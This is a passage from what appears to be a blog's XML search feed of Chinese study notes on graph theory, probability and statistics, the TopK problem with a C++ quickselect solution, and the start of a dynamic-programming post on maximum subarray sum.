的支配数为 $\min (m, n)$</li></ul></li><li>点独立集、极大独立集、最大独立集、独立数：受干扰的通信系统，设 $G=(V, E, \gamma)$ 是一个无向图, $S \subseteq V$，若对任意 $\boldsymbol{u}, \boldsymbol{v} \in \boldsymbol{S}$, 都有 $\boldsymbol{u}$ 与 $\boldsymbol{v}$ 不相邻, 则称 $S$是 $G$ 的一个点独立集或简称独立集<ul><li>无向简单图的极大独立集都是极小支配集，反之不成立</li><li>完全图 $\boldsymbol{K}_{n}(n \geq 3)$ 的独立数为1</li><li>完全二部图 $K_{m . n}$ 的独立数为 $\max (m, n)$</li></ul></li><li>点覆盖、极小点覆盖、最小点覆盖、点覆盖数：小区监控，设 $G(V, E)$ 是简单图, $V^{<em>} \subseteq V$，如果对于任意 $e \in E$, 都存在 $v \in V^{</em>}$, 使得 $v$ 是 $e$ 的 一个端点, 则称 $V^{*}$ 为 $G$ 的一个点覆盖集，简称点覆盖<ul><li>点覆盖数&gt;=点支配数</li><li>点覆盖数+点独立数=点数</li><li>完全图 $\boldsymbol{K}_{\boldsymbol{n}}(n \geq \mathbf{3})$ 中点覆盖数是 $\boldsymbol{n}-\mathbf{1}$</li><li>完全二部图 $\boldsymbol{K}_{\boldsymbol{m} . n}$ 的点覆盖数是 $\min (m, n)$</li></ul></li></ul></li><li>边覆盖集与匹配<ul><li>边覆盖集、极小边覆盖、最小边覆盖、边覆盖数：设 $G(V, E)$ 是没有孤立顶点的简单图, $E^{<em>} \subseteq E$，如果对于任意 $\boldsymbol{v} \in V$, 都存在 $e \in E^{</em>}$, 使得 $\boldsymbol{v}$ 是 $\boldsymbol{e}$ 的 一个端点, 则称 $\boldsymbol{E}$ *为 $G$ 的一个边覆盖集, 简称边覆盖<ul><li>完全图 $K_{n}(n \geq 3)$ 中边覆盖数 $\rho(G)=[n / 2\rceil$</li><li>完全二部图 $K_{m, n}$ 的边覆盖数 $\rho(G)=\max (m, n)$</li><li>圈图 $C_{n}(n \geq 3)$ 的边覆盖数为 $\lceil n / 2\rceil$</li><li>任何完美匹配都是最小边覆盖</li></ul></li><li>边独立集（匹配）、极大匹配、最大匹配、匹配数、完美匹配：设 $G=(V, E)$ 是简单图, $M \subseteq E$ 。 如果 $M$ 中任何两条边都不邻接, 则称 $M$ 为 $G$ 中的一个匹配或边独立集<ul><li>完全图 $\boldsymbol{K}_{n}(n \geq \mathbf{3})$ 中匹配数为 $\lfloor n / 2\rfloor$</li><li>完全二部图 $K_{m . n}$ 的匹配数为 $\min (m, n)$</li><li>圈图 $C_{n}(n \geq 3)$ 的匹配数为 $\lfloor n / 2\rfloor$</li></ul></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 课程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计</title>
      <link href="/2021/07/24/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/"/>
      <url>/2021/07/24/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="第1章-概率论的基本概念"><a href="#第1章-概率论的基本概念" class="headerlink" title="第1章  概率论的基本概念"></a>第1章  概率论的基本概念</h1><h2 id="0x01-事件间的关系与事件的运算（维恩图）"><a href="#0x01-事件间的关系与事件的运算（维恩图）" class="headerlink" title="0x01 事件间的关系与事件的运算（维恩图）"></a><strong>0x01 事件间的关系与事件的运算（维恩图）</strong></h2><ol><li>包含关系和相等关系  </li><li>和事件 <script type="math/tex">A \bigcup B</script> ：A、B中至少有一个发生  </li><li>积事件 <script type="math/tex">A \bigcap B</script> ：A、B同时发生  </li><li>差事件 <script type="math/tex">A-B</script> ：A发生且B不发生  </li><li>事件的互不相容(互斥)<script type="math/tex">A \bigcap B = \emptyset</script> ：A与B不能同时发生  </li><li>对立事件(逆事件)<script type="math/tex">A \bigcap B 且 A \bigcap B = \emptyset</script>：A与B有且仅有一个发生  </li><li>事件的运算律：交换律、分配律、<strong>对偶律（德摩根律）</strong></li></ol><h2 id="0x02-概率的一些重要性质"><a href="#0x02-概率的一些重要性质" class="headerlink" title="0x02 概率的一些重要性质"></a><strong>0x02 概率的一些重要性质</strong></h2><ol><li>减法公式： <script type="math/tex">P(B-A)=P(B)-P(AB)</script> ，特别地：当 <script type="math/tex">A \subset B</script>时， <script type="math/tex">P(B-A)=P(B)-P(A)</script>   </li><li>加法公式： <script type="math/tex">P(A \bigcup B) = P(A)+P(B)-P(AB)</script> 推广：<a href="https://baike.baidu.com/item/%E5%AE%B9%E6%96%A5%E5%8E%9F%E7%90%86" target="_blank" rel="noopener">容斥原理</a></li></ol><h2 id="0x03-古典概型（等可能概型）"><a href="#0x03-古典概型（等可能概型）" class="headerlink" title="0x03 古典概型（等可能概型）"></a><strong>0x03 古典概型（等可能概型）</strong></h2><ol><li>公式： <script type="math/tex">P = \frac{A中基本事件数}{S中基本事件总数} = \frac{k}{n}</script>   </li><li>加法原理、乘法原理  </li><li><strong>抓阄原理</strong>：总共有N个阄，其中m个有奖(m≤N)，有1～N个人抓阄，在不提前公布结果的情况下每个人中奖的概率相同，均为m/N。应用于商城抽奖、抽签等活动。  </li><li>实际推断原理:“小概率事件在一次试验中实际上是不可能发生的”  </li><li><strong>排列组合：</strong>优秀笔记：<a href="https://zhuanlan.zhihu.com/p/42859784" target="_blank" rel="noopener">我跳</a></li></ol><h2 id="0x04-条件概率"><a href="#0x04-条件概率" class="headerlink" title="0x04 条件概率"></a>0x04 条件概率</h2><ol><li>在古典概型中： <script type="math/tex">P(B | A) = \frac{n_{AB}}{n_A} = \frac {P(AB)}{P(A)}</script> (计算条件概率的两种方法)  </li><li>乘法定理（变形）：若 <script type="math/tex">P(A)>0</script> ，则 <script type="math/tex">P(AB) = P(A)P(B | A)</script>   推广:  <script type="math/tex">P(AB)>0</script> , 则有 <script type="math/tex">P(ABC)=P(A)P(B|A)P(C|AB)</script>   </li><li>全概率公式： <script type="math/tex">P(A) = \sum_{i=1}^n {P(A|B_i)P(B_i)}</script> （知原因推结果，找样本空间的划分）特例： <script type="math/tex">P(A) = P(AB)+P(A \overline B)</script>   </li><li>贝叶斯公式： <script type="math/tex">P(B_i|A) = \frac{P(AB_i)}{P(A)} = \frac{P(A|B_i)P(B_i)}{P(A)}</script> （知结果推原因）</li></ol><h2 id="0x05-独立性"><a href="#0x05-独立性" class="headerlink" title="0x05 独立性"></a><strong>0x05 独立性</strong></h2><ol><li>定义：<script type="math/tex">P(AB) = P(A)P(B)</script> 推广：P(AB)=P(A)P(B), P(AC)=P(A)P(C), P(BC)=P(B)P(C), P(ABC)=P(A)P(B)P(C)， 则称A,B,C为相互独立的事件。</li><li>若n个事件相互独立，必蕴含这n个事件两两相互独立, 反之不真。</li><li>定理一：设A,B是两事件,且P(A)&gt;0,则A,B相互独立的充要条件是:   P(B|A)=P(B).  </li><li>定理二：若A、B相互独立，则 <script type="math/tex">\overline {A}与B、\overline{A}与\overline{B}、A与\overline{B}</script> 也相互独立</li><li>$P(A) &gt; 0、P(B)&gt;0$时，A、B相互独立与互不相容不能同时成立。</li><li>事件A、B对立即: P(AB)=P(A)P(B);   </li><li>事件A、B互斥即: P(A+B)=P(A)+P(B)或等价地P(AB)=0，  </li><li>当事件A、B的概率都不为0时，对立与互斥两种情况确实不能同时发生。_</li></ol><h1 id="第2章-随机变量及其分布"><a href="#第2章-随机变量及其分布" class="headerlink" title="第2章 随机变量及其分布"></a>第2章 随机变量及其分布</h1><h2 id="0x01-随机变量"><a href="#0x01-随机变量" class="headerlink" title="0x01 随机变量"></a><strong>0x01 随机变量</strong></h2><ol><li><strong>定义</strong>：对于每个基本事件e都有一个实数X(e)对应，即X(e)是定义在S上的单值实函数，称为随机变量(r.v.)。</li><li><strong>统计规律性：</strong>分布律、分布列</li><li>求解分布列：①确定r.v.X的所有取值 ②求解对应概率 ③检验 <script type="math/tex">\sum_{k=0}^{n}p_k = 1</script> </li><li>判断是否构成分布律：非负性、规范性</li></ol><h2 id="0x02-重要的离散型r-v"><a href="#0x02-重要的离散型r-v" class="headerlink" title="0x02 重要的离散型r.v."></a><strong>0x02 重要的离散型r.v.</strong></h2><h3 id="01-0-1分布："><a href="#01-0-1分布：" class="headerlink" title="01. 0-1分布："></a>01. 0-1分布：</h3><h3 id="02-二项分布"><a href="#02-二项分布" class="headerlink" title="02. 二项分布"></a>02. 二项分布</h3><ul><li><strong>定义：</strong> <script type="math/tex">P(X=k)=  \begin{pmatrix} n \\ k\end{pmatrix} p^k(1-p)^{n-k}</script> ，k=0, 1, 2 … n，记作X~ b(n, p)</li><li><strong>公式：</strong> <script type="math/tex">\sum_{k=0}^{n} P(X=k) = ( p+(1-p) )^n</script> </li><li><strong>二项分布的最可能发生次数</strong>：大于前面，大于后面，构造不等式</li></ul><p><img alt="&#x56FE;1 &#x4E8C;&#x9879;&#x5206;&#x5E03;&#x7684;&#x6700;&#x53EF;&#x80FD;&#x53D1;&#x751F;&#x6B21;&#x6570;&#x89E3;&#x6CD5;" data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-03-16_17-33-49.jpg" class="lozad"></p><h3 id="03-泊松分布"><a href="#03-泊松分布" class="headerlink" title="03. 泊松分布"></a><strong>03. 泊松分布</strong></h3><ul><li><strong>定义</strong>：若X的分布为 <script type="math/tex">P(X=k) = \frac{λ^ke^{-λ}}{k!}</script> ，k=0, 1, 2 … 其中λ&gt;0是常数，则称X服从参数为λ的泊松分布，记作 X~π(λ) 或 X~P(λ)</li><li><strong>公式：</strong> <script type="math/tex">\sum_{k=0}^{\infty}P(X=k) = \sum_{k=0}^{\infty}\frac{λ^ke^{-λ}}{k!} = e^{-λ}\sum_{k=0}^{\infty}\frac{λ^k}{k!} = 1</script>  　　　  <strong><strong><script type="math/tex">e^x = \sum_{k=0}^{\infty}\frac{x^k}{k!}</script> </strong></strong></li><li><strong>应用</strong>：某一地区一个时间间隔内发生的交通事故，一本书的印刷错误数等。</li><li><strong>泊松(Poisson)定理：</strong>设随机变量序列{ <script type="math/tex">X_n</script> }， <script type="math/tex">X_n</script> ~ <script type="math/tex">b(n, p_n)</script> ，则 <script type="math/tex">\lim_{n \to +\infty}P(X_n=k)=\lim_{n \to +\infty} \begin{pmatrix} n \\ k\end{pmatrix}p^k(1-p)^{n-k} = \frac{λ^ke^{-λ}}{k!}</script>，其中 <script type="math/tex">np_n = λ>0</script> ，k为任一固定的非负整数 ①  在定理的条件下, 二项分布的极限分布是泊松分布 ② 当n( <script type="math/tex">n \geq 10</script> )很大且p( <script type="math/tex">p\leq 0.01</script> )又较小时， <script type="math/tex">\begin{pmatrix} n \\ k\end{pmatrix}p^k(1-p)^{n-k}   \approx\frac{λ^ke^{-λ}}{k!}</script> ，其中 <script type="math/tex">np = λ</script> </li></ul><h3 id="04-几何分布"><a href="#04-几何分布" class="headerlink" title="04. 几何分布"></a>04. 几何分布</h3><ul><li><strong>定义</strong>：进行重复独立试验, 设每次试验成功的概率为p，失败的概率为1-    p=q(0&lt;p&lt;1), 将试验进行到出现一次成功为止, 以X表示所需的试验次数, 则X的分布律为: P{X=k}= <script type="math/tex">q^{k-1}p</script> ,    k=1, 2, …  称为X服从参数为p的几何分布。</li></ul><h2 id="0x03-分布函数"><a href="#0x03-分布函数" class="headerlink" title="0x03 分布函数"></a>0x03 分布函数</h2><ol><li><strong>定义</strong>：设随机变量 X, x为任意实数,  则 F(x)=P{ X ≤ x } 称为X的分布函数。</li><li><strong>性质 ①</strong> F(x)是单调不减函数 ② <script type="math/tex">0≤F(x)≤1,  F(-\infty)=0, F(+\infty)=1</script>  *③ F(x)至多有可列个间断点, 而在其间断点上也是右连续的,F(x+0)=F(x). </li><li>离散型r.v.X的分布函数是阶梯函数。</li><li>判断分布函数：非负规范性、单调不减性、右连续性</li><li>求端点值：该点的分布函数的右极限-左极限</li></ol><h2 id="0x04-连续型随机变量及其分布"><a href="#0x04-连续型随机变量及其分布" class="headerlink" title="0x04 连续型随机变量及其分布"></a>0x04 连续型随机变量及其分布</h2><ol><li><strong>定义</strong>：对于r.v.X的分布函数F(x)，存在非负可积函数f(x)，使对于任意的实数x，有 <script type="math/tex">F(x) = \int_{-\infty}^{x}f(t)dt</script> ，则f(x)为概率密度函数</li><li>连续型r.v.X的分布函数是连续函数</li><li><strong>性质</strong>： ① <script type="math/tex">f(x)≥0</script>  ②  <script type="math/tex">\int_{-\infty}^{+\infty}f(x)dx = 1</script>  ③ <script type="math/tex">\forall x_1<x_2，P(x_1<X\leq x_2) = F(x_2)-F(x_1)=\int_{x_1}^{x_2}f(x)dx</script>  ④ 若f(x)在x处连续，则有 <script type="math/tex">F'(x) = f(x)</script> </li><li><strong>定理</strong>：设X是连续型r.v.，任取指定的实数值a的概率均为0，P{X = a} = 0</li></ol><h2 id="0x05-常用的连续型r-v-分布"><a href="#0x05-常用的连续型r-v-分布" class="headerlink" title="0x05 常用的连续型r.v.分布"></a>0x05 常用的连续型r.v.分布</h2><h3 id="1-均匀分布"><a href="#1-均匀分布" class="headerlink" title="1. 均匀分布"></a>1. 均匀分布</h3><ul><li><strong>定义</strong>：设随机变量X在区间(a, b)上取值，且概率密度为： <script type="math/tex">f(x) =  \begin{cases}    \frac{1}{b-a},  & \text{$a<x<b$} \\    0, & \text{others}         \end{cases}</script> ，则称r.v.X在（a, b）上服从均匀分布，记作 <script type="math/tex">X</script> ~ <script type="math/tex">U(a,b)</script> </li><li><strong>分布函数</strong>： <script type="math/tex">F(x)= \begin{cases}   0  & \text{$x<a$} \\      \frac{x-a}{b-a} & \text{$a\leq x<b$}\\ 1 &{x\geq b} \end{cases}</script> </li></ul><h3 id="2-指数分布"><a href="#2-指数分布" class="headerlink" title="2. 指数分布"></a>2. 指数分布</h3><ul><li><strong>定义</strong>：设连续型r.v.X的概率密度为：<script type="math/tex">f(x) =  \begin{cases}   \frac{1}{θ}e^{-\frac{x}{θ}},  & {x\geq 0} \\   0, & {x<0}         \end{cases}，θ>0</script> 则称X服从参数为θ的指数分布。</li><li><strong>分布函数</strong>： <script type="math/tex">F(x) =  \begin{cases}   1-e^{-\frac{x}{θ}},  & {x\geq 0} \\   0, & {x<0}         \end{cases}</script> </li><li><strong>无记忆性</strong>： <script type="math/tex">P(X>s+t | X>s) = P(X>t)</script> </li></ul><h3 id="3-正态分布"><a href="#3-正态分布" class="headerlink" title="3. 正态分布"></a>3. 正态分布</h3><ul><li><strong>定义</strong>：设连续型r.v.X的概率密度为：<script type="math/tex">f(x)= \frac{1}{\sqrt{2π}σ} e^{\frac{-(x-μ)^2}{2σ^2}}，-\infty<x<+\infty</script> ，其中μ、σ(σ&gt;0)为常数，则称X服从参数为μ、σ的正态分布，记作X ~ N(μ, σ)</li><li>μ(期望)：位置参数，f(x)的图形关于 x = μ对称， <script type="math/tex">Max = f(μ) = \frac{1}{\sqrt{2π}σ}</script> </li><li>σ(均差)：影响f(x)的曲线形状和最大值</li><li><strong>分布函数</strong>： <script type="math/tex">F(x) = \int_{-\infty}^{x}\frac{1}{\sqrt{2π}σ} e^{\frac{-(t-μ)^2}{2σ^2}}dt</script></li></ul><h1 id="第3章-多维随机变量及其分布"><a href="#第3章-多维随机变量及其分布" class="headerlink" title="第3章 多维随机变量及其分布"></a>第3章 多维随机变量及其分布</h1><h1 id="第4章-随机变量的数字特征"><a href="#第4章-随机变量的数字特征" class="headerlink" title="第4章 随机变量的数字特征"></a>第4章 随机变量的数字特征</h1><ul><li>期望：EX</li><li>方差：$DX^2=E(X-E(X))^2=EX^2-(EX)^2$</li><li>协方差及相关系数</li></ul><h1 id="第5章-大数定律及中心极限定理"><a href="#第5章-大数定律及中心极限定理" class="headerlink" title="第5章 大数定律及中心极限定理"></a>第5章 大数定律及中心极限定理</h1><ul><li>大数定律：凡是用来阐明大量独立重复试验的平均结果具有稳定性的一系列定理，统称为大数定律。<ul><li>切比雪夫大数定律：设随机变量 $\boldsymbol{X}<em>{1}, \boldsymbol{X}</em>{2}, \cdots, \boldsymbol{X}<em>{n}, \cdots$ 相互独立, 并且具有相同的数学期望和方差：$\boldsymbol{E}\left(\boldsymbol{X}</em>{\boldsymbol{k}}\right)=\boldsymbol{\mu}, <script type="math/tex">\boldsymbol{D}\left(\boldsymbol{X}_{\boldsymbol{k}}\right)=\boldsymbol{\sigma}^{2},</script>(\boldsymbol{k}=1,2, \cdots)$, 作前 $\boldsymbol{n}$ 个随机变量的算术平均$\bar{X}=\frac{1}{n} \sum<em>{k=1}^{n} X</em>{k}$, 则对于任意正数 $\varepsilon$ 有$\lim <em>{n \rightarrow \infty} P{|\bar{X}-\mu|&lt;\varepsilon}=\lim </em>{n \rightarrow \infty} P\left{\frac{1}{n} \sum<em>{k=1}^{n} X</em>{k}-\mu&lt;\varepsilon\right}=1$<ul><li>切比雪夫不等式：设随机变量 $X$ 具有数学期望 $E(X)=\mu, D(X)=\sigma^{2}$, 则对于任意正数 $\varepsilon$, 不等式$P{|X-\mu| \geq \varepsilon} \leq \frac{\sigma^{2}}{\varepsilon^{2}}$成立</li><li>另一种叙述：设随机变量 $X<em>{1}, X</em>{2}, \cdots, X<em>{n}, \cdots$ 相互独立, 且具有相同的数学期望 和方差： $\boldsymbol{E}\left(\boldsymbol{X}</em>{k}\right)=\mu$,<br>$D\left(X<em>{k}\right)=\sigma^{2}(k=1,2, \cdots)$, 则序列 $\bar{X}=\frac{1}{n} \sum</em>{k=1}^{n} X_{k}$依概率收敛于 $\mu$, 即 $\bar{X} \stackrel{P}{\longrightarrow} \mu .$</li></ul></li><li>伯努利大数定律：设 $\boldsymbol{n}<em>{A}$ 是 $\boldsymbol{n}$ 次独立重复试验中事件 $\boldsymbol{A}$ 发生的次数， $\boldsymbol{p}$ 是事件 $\boldsymbol{A}$ 在每次试 验中发生的概率，则有$\frac{n</em>{A}}{n} \stackrel{P}{\longrightarrow} p $<ul><li>伯努利大数定律实际上告诉我们，频率依概率收敛于概率，这是我们在给出概率的定义时说过的内容，在这里得到了佐证。</li><li>伯努利大数定律是切比雪夫大数定律的特殊情形。</li></ul></li><li>辛钦大数定律：设随机变量 $X<em>{1}, X</em>{2}, \cdots, X<em>{n}, \cdots$, 相互独立，服从同一分布，且具有数学 期望 $E\left(X</em>{k}\right)=\mu(k=1,2, \ldots)$, 则$\frac{1}{n} \sum<em>{k=1}^{n} X</em>{k} \stackrel{P}{\longrightarrow} \mu$<ul><li>与定理一相比，不要求方差存在，但需服从同一分布；</li><li>伯努利大数定律是辛钦大数定律的特殊情况.</li></ul></li></ul></li><li>中心极限定理<ul><li>引入：在自然界与生产中，一些随机变量的取值会受到许多不确定因素的影响，如果这些因素彼此之间没有什么依存关系、且谁也没有特别突出的影响，那么，这些影响的累积效应将会使随机变量近似地服从正态分布.中心极限定理就是从数学上证明了这一现象。</li><li>独立同分布极限定理：设随机变量 $X<em>{1}, X</em>{2}, \cdots, X<em>{n}, \cdots$ 相互独立， 服从同一分布，且具有 数学期望和方差 $: E\left(X</em>{k}\right)=\mu,$$ D\left(X<em>{k}\right)=\sigma^{2}&gt;0(k=1,2, \cdots)$, 则随机变量之和的标准化变量$Y</em>{n}=\frac{\sum<em>{i=1}^{n} X</em>{i}-n \mu}{\sqrt{n} \sigma}$，当n很大时，随机变量近似地服从标准正态分布 $ \mathrm{N}(0,1)$</li></ul></li></ul><h1 id="第6章-样本及抽样分布"><a href="#第6章-样本及抽样分布" class="headerlink" title="第6章 样本及抽样分布"></a>第6章 样本及抽样分布</h1><h1 id="第7章-参数估计"><a href="#第7章-参数估计" class="headerlink" title="第7章 参数估计"></a>第7章 参数估计</h1><ul><li>点估计</li><li>区间估计</li></ul><h1 id="第8章-假设检验"><a href="#第8章-假设检验" class="headerlink" title="第8章 假设检验"></a>第8章 假设检验</h1>]]></content>
      
      
      <categories>
          
          <category> 课程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TopK问题</title>
      <link href="/2021/07/24/TopK%E9%97%AE%E9%A2%98/"/>
      <url>/2021/07/24/TopK%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>给定整数数组 nums 和整数 k，请返回数组中第 k 个最大的元素。</p><p>请注意，你需要找的是数组排序后的第 k 个最大的元素，而不是第 k 个不同的元素。</p><h1 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h1><blockquote><p>参考：<a href="https://zhuanlan.zhihu.com/p/76734219" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/76734219</a></p></blockquote><h2 id="思路1-排序"><a href="#思路1-排序" class="headerlink" title="思路1 排序"></a>思路1 排序</h2><p>将n个数排序之后，取出第k大的数即可。</p><p>时间复杂度：$O(n*log(n))$</p><p>分析：明明只需要TopK，却将全局都排序了，这也是这个方法复杂度非常高的原因。那能不能不全局排序，而只局部排序呢？</p><h2 id="思路2-局部排序"><a href="#思路2-局部排序" class="headerlink" title="思路2 局部排序"></a>思路2 局部排序</h2><p>不再全局排序，只对最大的k个排序。冒泡是一个很常见的排序方法，每冒一个泡，找出最大值，冒k个泡，就得到TopK。</p><p>时间复杂度：$O(n*k)$</p><p>分析：冒泡，将全局排序优化为了局部排序，非TopK的元素是不需要排序的，节省了计算资源。不少朋友会想到，需求是TopK，是不是这最大的k个元素也不需要排序呢？</p><h2 id="思路3-堆"><a href="#思路3-堆" class="headerlink" title="* 思路3 堆"></a>* 思路3 堆</h2><p>思路：只找到TopK，不排序TopK。先用前k个元素生成一个小顶堆，这个小顶堆用于存储，当前最大的k个元素。接着，从第k+1个元素开始扫描，和堆顶（堆中最小的元素）比较，如果被扫描的元素大于堆顶，则替换堆顶的元素，并调整堆，以保证堆内的k个元素，总是当前最大的k个元素。直到，扫描完所有n-k个元素，最终堆中的k个元素，就是TopK。</p><p>时间复杂度：$O(n*log(k))$</p><p>画外音：n个元素扫一遍，假设运气很差，每次都入堆调整，调整时间复杂度为堆的高度，即$lg(k)$，故整体时间复杂度是$n*lg(k)$。</p><p>分析：堆，将冒泡的TopK排序优化为了TopK不排序，节省了计算资源。堆，是求TopK的经典算法，那还有没有更快的方案呢？</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="思路4-Partition"><a href="#思路4-Partition" class="headerlink" title="思路4 Partition"></a>思路4 Partition</h2><p>除了用来进行快速排序，partition 还可以用 $O(N)$ 的平均时间复杂度解决TopK问题。和快排一样，这里也用到了分而治之的思想。首先用 partition 将数组分为两部分，得到分界点下标 pos，然后分三种情况：</p><ul><li>pos == k-1，则找到第 K 大的值，arr[pos]；</li><li>pos &gt; k-1，则第 K 大的值在左边部分的数组。</li><li>pos &lt; k-1，则第 K 大的值在右边部分的数组。</li></ul><p>下面给出基于迭代的实现（这里寻找第 k 小的数字）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pivot = nums[low];</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">            <span class="keyword">while</span> (low &lt; high &amp;&amp; nums[high] &lt;= pivot) high--;</span><br><span class="line">            nums[low] = nums[high];</span><br><span class="line">            <span class="keyword">while</span> (low &lt; high &amp;&amp; nums[low] &gt;= pivot) low++;</span><br><span class="line">            nums[high] = nums[low];</span><br><span class="line">        &#125;</span><br><span class="line">        nums[low] = pivot;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findKthLargest</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> begin = <span class="number">0</span>, end = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (begin &lt; end) &#123;</span><br><span class="line">            <span class="keyword">int</span> pos = partition(nums, begin, end);</span><br><span class="line">            <span class="keyword">if</span> (pos == k - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> nums[pos];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pos &lt; k - <span class="number">1</span>) &#123;</span><br><span class="line">                begin = pos + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                end = pos - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[begin];<span class="comment">//数组长度为1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>时间复杂度：考虑最坏情况下，每次 partition 将数组分为长度为 $N-1$ 和 $1$ 的两部分，然后在长的一边继续寻找第 K 大，此时时间复杂度为 $O(N^2 )$。不过如果在开始之前将数组进行随机打乱，那么可以尽量避免最坏情况的出现（随机选择算在是《算法导论》中一个经典的算法，其时间复杂度为O(n)，是一个线性复杂度的方法。）。而在最好情况下，每次将数组均分为长度相同的两半，运行时间 $T(N) = N + T(N/2)$，时间复杂度是 $O(N)$。</p><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><ol><li><a href="https://leetcode-cn.com/problems/smallest-k-lcci/" target="_blank" rel="noopener">leetcode——面试题 17.14. 最小K个数</a></li><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> 面试篇 </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>动态规划</title>
      <link href="/2021/07/23/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
      <url>/2021/07/23/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-最大子序和"><a href="#1-最大子序和" class="headerlink" title="1 最大子序和"></a>1 最大子序和</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数数组 <code>nums</code> ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。</p><p>链接：<a href="https://leetcode-cn.com/problems/maximum-subarray/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/maximum-subarray/</a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><strong>状态</strong>：$dp[i]$ 代表以$nums[i]$结尾的最大和</li><li><strong>状态转移方程</strong>：$dp[i] = max(dp[i-1]+nums[i], nums[i])$</li><li><strong>答案</strong>：$max(dp[0…n-1])$</li></ol><ul><li><strong>时间复杂度</strong>：循环执行 n 次，每次花费常数的时间代价，故渐进时间复杂度为 $O(n)$。</li><li><strong>空间复杂度</strong>：$O(n)$，可用滚动数组优化到$O(1)$。</li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> pre = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> ans = 